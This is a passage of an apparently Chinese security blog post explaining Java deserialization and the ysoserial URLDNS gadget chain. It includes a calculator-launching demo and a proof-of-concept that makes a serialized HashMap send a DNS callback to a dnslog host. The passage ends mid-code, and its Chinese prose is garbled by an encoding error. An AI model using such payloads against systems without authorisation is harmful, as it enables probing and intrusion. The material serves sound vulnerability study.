java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        Evil evil = <span class="keyword">new</span> Evil();</span><br><span class="line">        evil.cmd = <span class="string">&quot;open /System/Applications/Calculator.app&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">byte</span>[] serializeData = serialize(evil);</span><br><span class="line">        unserialize(serializeData);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] serialize(<span class="keyword">final</span> Object obj) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        ByteArrayOutputStream btout = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream objOut = <span class="keyword">new</span> ObjectOutputStream(btout);</span><br><span class="line">        objOut.writeObject(obj);</span><br><span class="line">        <span class="keyword">return</span> btout.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">unserialize</span><span class="params">(<span class="keyword">final</span> <span class="keyword">byte</span>[] serialized)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ByteArrayInputStream btin = <span class="keyword">new</span> ByteArrayInputStream(serialized);</span><br><span class="line">        ObjectInputStream objIn = <span class="keyword">new</span> ObjectInputStream(btin);</span><br><span class="line">        <span class="keyword">return</span> objIn.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210405200638.png"></p><h1 id="URLDNS"><a href="#URLDNS" class="headerlink" title="URLDNS"></a>URLDNS</h1><p><code>URLDNS</code> æ˜¯ysoserialä¸­åˆ©ç”¨é“¾çš„ä¸€ä¸ªåå­—ï¼Œé€šå¸¸ç”¨äºæ£€æµ‹æ˜¯å¦å­˜åœ¨Javaååºåˆ—åŒ–æ¼æ´ã€‚è¯¥åˆ©ç”¨é“¾å…·æœ‰å¦‚ä¸‹ç‰¹ç‚¹ï¼š</p><ul><li>ä¸é™åˆ¶jdkç‰ˆæœ¬ï¼Œä½¿ç”¨Javaå†…ç½®ç±»ï¼Œå¯¹ç¬¬ä¸‰æ–¹ä¾èµ–æ²¡æœ‰è¦æ±‚</li><li>ç›®æ ‡æ— å›æ˜¾ï¼Œå¯ä»¥é€šè¿‡DNSè¯·æ±‚æ¥éªŒè¯æ˜¯å¦å­˜åœ¨ååºåˆ—åŒ–æ¼æ´</li><li>URLDNSåˆ©ç”¨é“¾ï¼Œåªèƒ½å‘èµ·DNSè¯·æ±‚ï¼Œå¹¶ä¸èƒ½è¿›è¡Œå…¶ä»–åˆ©ç”¨</li></ul><p>ysoserialä¸­åˆ—å‡ºçš„Gadget:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">*   Gadget Chain:</span><br><span class="line">*     HashMap.readObject()</span><br><span class="line">*       HashMap.putVal()</span><br><span class="line">*         HashMap.hash()</span><br><span class="line">*           URL.hashCode()</span><br></pre></td></tr></table></figure><p>åŸç†ï¼š</p><p><code>java.util.HashMap</code> é‡å†™äº† <code>readObject</code>, åœ¨ååºåˆ—åŒ–æ—¶ä¼šè°ƒç”¨ <code>hash</code> å‡½æ•°è®¡ç®— key çš„ hashCode.è€Œ <code>java.net.URL</code> çš„ hashCode åœ¨è®¡ç®—æ—¶ä¼šè°ƒç”¨ <code>getHostAddress</code> æ¥è§£æåŸŸå, ä»è€Œå‘å‡º DNS è¯·æ±‚.</p><p>HashMap#readObject:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream s)</span> <span class="comment">// è¯»å–ä¼ å…¥çš„è¾“å…¥æµï¼Œå¯¹ä¼ å…¥çš„åºåˆ—åŒ–æ•°æ®è¿›è¡Œååºåˆ—åŒ–</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">    <span class="comment">// Read in the threshold (ignored), loadfactor, and any hidden stuff</span></span><br><span class="line">    s.defaultReadObject();</span><br><span class="line">    reinitialize();</span><br><span class="line">    <span class="keyword">if</span> (loadFactor &lt;= <span class="number">0</span> || Float.isNaN(loadFactor))</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> InvalidObjectException(<span class="string">&quot;Illegal load factor: &quot;</span> +</span><br><span class="line">                                         loadFactor);</span><br><span class="line">    s.readInt();                <span class="comment">// Read and ignore number of buckets</span></span><br><span class="line">    <span class="keyword">int</span> mappings = s.readInt(); <span class="comment">// Read number of mappings (size)</span></span><br><span class="line">    <span class="keyword">if</span> (mappings &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> InvalidObjectException(<span class="string">&quot;Illegal mappings count: &quot;</span> +</span><br><span class="line">                                         mappings);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (mappings &gt; <span class="number">0</span>) &#123; <span class="comment">// (if zero, use defaults)</span></span><br><span class="line">        <span class="comment">// Size the table using given load factor only if within</span></span><br><span class="line">        <span class="comment">// range of 0.25...4.0</span></span><br><span class="line">        <span class="keyword">float</span> lf = Math.min(Math.max(<span class="number">0.25f</span>, loadFactor), <span class="number">4.0f</span>);</span><br><span class="line">        <span class="keyword">float</span> fc = (<span class="keyword">float</span>)mappings / lf + <span class="number">1.0f</span>;</span><br><span class="line">        <span class="keyword">int</span> cap = ((fc &lt; DEFAULT_INITIAL_CAPACITY) ?</span><br><span class="line">                   DEFAULT_INITIAL_CAPACITY :</span><br><span class="line">                   (fc &gt;= MAXIMUM_CAPACITY) ?</span><br><span class="line">                   MAXIMUM_CAPACITY :</span><br><span class="line">                   tableSizeFor((<span class="keyword">int</span>)fc));</span><br><span class="line">        <span class="keyword">float</span> ft = (<span class="keyword">float</span>)cap * lf;</span><br><span class="line">        threshold = ((cap &lt; MAXIMUM_CAPACITY &amp;&amp; ft &lt; MAXIMUM_CAPACITY) ?</span><br><span class="line">                     (<span class="keyword">int</span>)ft : Integer.MAX_VALUE);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Check Map.Entry[].class since it&#x27;s the nearest public type to</span></span><br><span class="line">        <span class="comment">// what we&#x27;re actually creating.</span></span><br><span class="line">        SharedSecrets.getJavaOISAccess().checkArray(s, Map.Entry[].class, cap);</span><br><span class="line">        <span class="meta">@SuppressWarnings(&#123;&quot;rawtypes&quot;,&quot;unchecked&quot;&#125;)</span></span><br><span class="line">        Node&lt;K,V&gt;[] tab = (Node&lt;K,V&gt;[])<span class="keyword">new</span> Node[cap];</span><br><span class="line">        table = tab;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Read the keys and values, and put the mappings in the HashMap</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; mappings; i++) &#123;</span><br><span class="line">            <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                K key = (K) s.readObject();</span><br><span class="line">            <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                V value = (V) s.readObject();</span><br><span class="line">            putVal(hash(key), key, value, <span class="keyword">false</span>, <span class="keyword">false</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…³æ³¨<code>putVal</code>æ–¹æ³•ï¼Œ<code>putVal</code>æ˜¯å¾€HashMapä¸­æ”¾å…¥é”®å€¼å¯¹çš„æ–¹æ³•ï¼Œè¿™é‡Œè°ƒç”¨äº†<code>hash</code>æ–¹æ³•æ¥å¤„ç†keyï¼Œè·Ÿè¿›<code>hash</code>æ–¹æ³•ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> <span class="title">hash</span><span class="params">(Object key)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> h;</span><br><span class="line">    <span class="keyword">return</span> (key == <span class="keyword">null</span>) ? <span class="number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="number">16</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œåˆè°ƒç”¨äº†<code>key.hashcode</code>æ–¹æ³•ï¼Œè€Œkeyæ­¤æ—¶æ˜¯æˆ‘ä»¬ä¼ å…¥çš„ <code>java.net.URL</code> å¯¹è±¡ï¼Œé‚£ä¹ˆè·Ÿè¿›åˆ°è¿™ä¸ªç±»çš„hashCode()æ–¹æ³•çœ‹ä¸‹</p><p>URL#hashCode</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">int</span> <span class="title">hashCode</span><span class="params">()</span> </span>&#123;  <span class="comment">// synchronized å…³é”®å­—ä¿®é¥°çš„æ–¹æ³•ä¸ºåŒæ­¥æ–¹æ³•ã€‚å½“synchronizedæ–¹æ³•æ‰§è¡Œå®Œæˆ–å‘ç”Ÿå¼‚å¸¸æ—¶ï¼Œä¼šè‡ªåŠ¨é‡Šæ”¾é”ã€‚</span></span><br><span class="line">      <span class="keyword">if</span> (hashCode != -<span class="number">1</span>)</span><br><span class="line">          <span class="keyword">return</span> hashCode;</span><br><span class="line"></span><br><span class="line">      hashCode = handler.hashCode(<span class="keyword">this</span>);</span><br><span class="line">      <span class="keyword">return</span> hashCode;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>å½“hashCodeå­—æ®µç­‰äº-1æ—¶ä¼šè¿›è¡Œ<code>handler.hashCode(this)</code>è®¡ç®—ï¼Œè·Ÿè¿›handlerå‘ç°ï¼Œå®šä¹‰æ˜¯</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">transient</span> URLStreamHandler handler; <span class="comment">// transient å…³é”®å­—ï¼Œä¿®é¥°Javaåºåˆ—åŒ–å¯¹è±¡æ—¶ï¼Œä¸éœ€è¦åºåˆ—åŒ–çš„å±æ€§</span></span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆè·Ÿè¿›<code>java.net.URLStreamHandler#hashCode()</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">int</span> <span class="title">hashCode</span><span class="params">(URL u)</span> </span>&#123;</span><br><span class="line">       <span class="keyword">int</span> h = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">       <span class="comment">// Generate the protocol part.</span></span><br><span class="line">       String protocol = u.getProtocol();</span><br><span class="line">       <span class="keyword">if</span> (protocol != <span class="keyword">null</span>)</span><br><span class="line">           h += protocol.hashCode();</span><br><span class="line"></span><br><span class="line">       <span class="comment">// Generate the host part.</span></span><br><span class="line">       InetAddress addr = getHostAddress(u);</span><br><span class="line">       <span class="keyword">if</span> (addr != <span class="keyword">null</span>) &#123;</span><br><span class="line">           h += addr.hashCode();</span><br><span class="line">       &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">           String host = u.getHost();</span><br><span class="line">           <span class="keyword">if</span> (host != <span class="keyword">null</span>)</span><br><span class="line">               h += host.toLowerCase().hashCode();</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="comment">// Generate the file part.</span></span><br><span class="line">       String file = u.getFile();</span><br><span class="line">       <span class="keyword">if</span> (file != <span class="keyword">null</span>)</span><br><span class="line">           h += file.hashCode();</span><br><span class="line"></span><br><span class="line">       <span class="comment">// Generate the port part.</span></span><br><span class="line">       <span class="keyword">if</span> (u.getPort() == -<span class="number">1</span>)</span><br><span class="line">           h += getDefaultPort();</span><br><span class="line">       <span class="keyword">else</span></span><br><span class="line">           h += u.getPort();</span><br><span class="line"></span><br><span class="line">       <span class="comment">// Generate the ref part.</span></span><br><span class="line">       String ref = u.getRef();</span><br><span class="line">       <span class="keyword">if</span> (ref != <span class="keyword">null</span>)</span><br><span class="line">           h += ref.hashCode();</span><br><span class="line"></span><br><span class="line">       <span class="keyword">return</span> h;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>u æ˜¯æˆ‘ä»¬ä¼ å…¥çš„urlï¼Œåœ¨è°ƒç”¨<code>getHostAddress</code>æ–¹æ³•æ—¶ï¼Œä¼šè¿›è¡ŒdnsæŸ¥è¯¢ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210408003342.png"></p><p>è¿™æ˜¯æ­£é¢åˆ†æçš„æµç¨‹ã€‚</p><p>å›åˆ°å¼€å§‹çš„Hashmap#readObject</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Read the keys and values, and put the mappings in the HashMap</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; mappings; i++) &#123;</span><br><span class="line">                <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                    K key = (K) s.readObject();</span><br><span class="line">                <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                    V value = (V) s.readObject();</span><br><span class="line">                putVal(hash(key), key, value, <span class="keyword">false</span>, <span class="keyword">false</span>);</span><br></pre></td></tr></table></figure><p>key æ˜¯ä»<code>K key = (K) s.readObject();</code>    è¿™æ®µä»£ç ï¼Œä¹Ÿæ˜¯å°±æ˜¯readObjectä¸­å¾—åˆ°çš„ï¼Œè¯´æ˜ä¹‹å‰åœ¨writeObjectä¼šå†™å…¥key</p><p>Hashmap#writeObject</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">writeObject</span><span class="params">(java.io.ObjectOutputStream s)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> buckets = capacity();</span><br><span class="line">    <span class="comment">// Write out the threshold, loadfactor, and any hidden stuff</span></span><br><span class="line">    s.defaultWriteObject();</span><br><span class="line">    s.writeInt(buckets);</span><br><span class="line">    s.writeInt(size);</span><br><span class="line">    internalWriteEntries(s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æœ€åè°ƒç”¨äº†<code>internalWriteEntries</code> æ–¹æ³•ï¼Œè·Ÿè¿›ä¸€ä¸‹å…·ä½“å®ç°ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Called only from writeObject, to ensure compatible ordering.</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">internalWriteEntries</span><span class="params">(java.io.ObjectOutputStream s)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    Node&lt;K,V&gt;[] tab;</span><br><span class="line">    <span class="keyword">if</span> (size &gt; <span class="number">0</span> &amp;&amp; (tab = table) != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; tab.length; ++i) &#123;</span><br><span class="line">            <span class="keyword">for</span> (Node&lt;K,V&gt; e = tab[i]; e != <span class="keyword">null</span>; e = e.next) &#123;</span><br><span class="line">                s.writeObject(e.key);</span><br><span class="line">                s.writeObject(e.value);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œçš„keyä»¥åŠvalueæ˜¯ä»tabä¸­å–çš„ï¼Œè€Œtabçš„å€¼å³HashMapä¸­tableçš„å€¼ã€‚</p><p>æƒ³è¦ä¿®æ”¹tableçš„å€¼ï¼Œå°±éœ€è¦è°ƒç”¨HashMap#putæ–¹æ³•ï¼Œè€ŒHashMap#putæ–¹æ³•ä¸­ä¹Ÿä¼šå¯¹keyè°ƒç”¨ä¸€æ¬¡hashæ–¹æ³•ï¼Œæ‰€ä»¥åœ¨è¿™é‡Œå°±ä¼šäº§ç”Ÿç¬¬ä¸€æ¬¡dnsæŸ¥è¯¢ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> V <span class="title">put</span><span class="params">(K key, V value)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> putVal(hash(key), key, value, <span class="keyword">false</span>, <span class="keyword">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸ºäº†é¿å…è¿™ä¸€æ¬¡çš„dnsæŸ¥è¯¢ï¼ˆé˜²æ­¢æœ¬æœºä¸ç›®æ ‡æœºå™¨å‘é€çš„dnsè¯·æ±‚æ··æ·†ï¼‰ï¼Œysoserial ä¸­ä½¿ç”¨<code>SilentURLStreamHandler</code>    æ–¹æ³•ï¼Œç›´æ¥è¿”å›nullï¼Œå¹¶ä¸ä¼šåƒ<code>URLStreamHandler</code>é‚£æ ·å»è°ƒç”¨ä¸€ç³»åˆ—æ–¹æ³•æœ€ç»ˆåˆ°<code>getByName</code>ï¼Œå› æ­¤ä¹Ÿå°±ä¸ä¼šè§¦å‘dnsæŸ¥è¯¢äº†</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">SilentURLStreamHandler</span> <span class="keyword">extends</span> <span class="title">URLStreamHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">protected</span> URLConnection <span class="title">openConnection</span><span class="params">(URL u)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">protected</span> <span class="keyword">synchronized</span> InetAddress <span class="title">getHostAddress</span><span class="params">(URL u)</span> </span>&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é™¤äº†è¿™ç§æ–¹æ³•è¿˜å¯ä»¥åœ¨æœ¬åœ°ç”Ÿæˆpayloadæ—¶ï¼Œå°†hashCodeè®¾ç½®ä¸ä¸º<code>-1</code>çš„å…¶ä»–å€¼ã€‚</p><p>URL#hashCode</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">int</span> <span class="title">hashCode</span><span class="params">()</span> </span>&#123;</span><br><span class="line">      <span class="keyword">if</span> (hashCode != -<span class="number">1</span>)</span><br><span class="line">          <span class="keyword">return</span> hashCode;</span><br><span class="line"></span><br><span class="line">      hashCode = handler.hashCode(<span class="keyword">this</span>);</span><br><span class="line">      <span class="keyword">return</span> hashCode;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>å¦‚æœä¸ä¸º<code>-1</code>ï¼Œé‚£ä¹ˆç›´æ¥è¿”å›äº†ã€‚ä¹Ÿå°±ä¸ä¼šè¿›è¡Œ<code>handler.hashCode(this);</code>è¿™ä¸€æ­¥è®¡ç®—hashcodeï¼Œä¹Ÿå°±æ²¡æœ‰ä¹‹åçš„<code>getByName</code>ï¼Œè·å–dnsæŸ¥è¯¢</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * The URLStreamHandler for this URL.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">transient</span> URLStreamHandler handler;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Our hash code.</span></span><br><span class="line"><span class="comment"> * @serial</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">int</span> hashCode = -<span class="number">1</span>;</span><br></pre></td></tr></table></figure><p>è€ŒhashCodeæ˜¯é€šè¿‡<code>private</code>å…³é”®å­—è¿›è¡Œä¿®é¥°çš„ï¼ˆæœ¬ç±»ä¸­å¯ä½¿ç”¨ï¼‰ï¼Œå¯ä»¥é€šè¿‡åå°„æ¥ä¿®æ”¹hashCodeçš„å€¼</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        HashMap map = <span class="keyword">new</span> HashMap();</span><br><span class="line">        URL url = <span class="keyword">new</span> URL(<span class="string">&quot;http://7gjq24.dnslog.cn&quot;</span>);</span><br><span class="line">        Field f = Class.forName(<span class="string">&quot;java.net.URL&quot;</span>).getDeclaredField(<span class="string">&quot;hashCode&quot;</span>); <span class="comment">// åå°„è·å–URLç±»ä¸­çš„hashCode</span></span><br><span class="line">        f.setAccessible(<span class="keyword">true</span>); <span class="comment">// ç»•è¿‡Javaè¯­è¨€æƒé™æ§åˆ¶æ£€æŸ¥çš„æƒé™</span></span><br><span class="line">        f.set(url,<span class="number">123</span>);</span><br><span class="line">        System.out.println(url.hashCode());</span><br><span class="line">        map.put(url,<span class="number">123</span>); <span class="comment">// è°ƒç”¨HashMapå¯¹è±¡ä¸­çš„putæ–¹æ³•ï¼Œæ­¤æ—¶å› ä¸ºhashcodeä¸ä¸º-1ï¼Œä¸å†è§¦å‘dnsæŸ¥è¯¢</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å®Œæ•´çš„POCï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        HashMap map = <span class="keyword">new</span> HashMap();</span><br><span class="line">        URL url = <span class="keyword">new</span> URL(<span class="string">&quot;http://7gjq24.dnslog.cn&quot;</span>);</span><br><span class="line">        Field f = Class.forName(<span class="string">&quot;java.net.URL&quot;</span>).getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">        f.setAccessible(<span class="keyword">true</span>); <span class="comment">// ç»•è¿‡Javaè¯­è¨€æƒé™æ§åˆ¶æ£€æŸ¥çš„æƒé™</span></span><br><span class="line">        f.set(url,<span class="number">123</span>); <span class="comment">// è®¾ç½®hashcodeçš„å€¼ä¸º-1çš„å…¶ä»–ä»»ä½•æ•°å­—</span></span><br><span class="line">        System.out.println(url.hashCode());</span><br><span class="line">        map.put(url,<span class="number">123</span>); <span class="comment">// è°ƒç”¨HashMapå¯¹è±¡ä¸­çš„putæ–¹æ³•ï¼Œæ­¤æ—¶å› 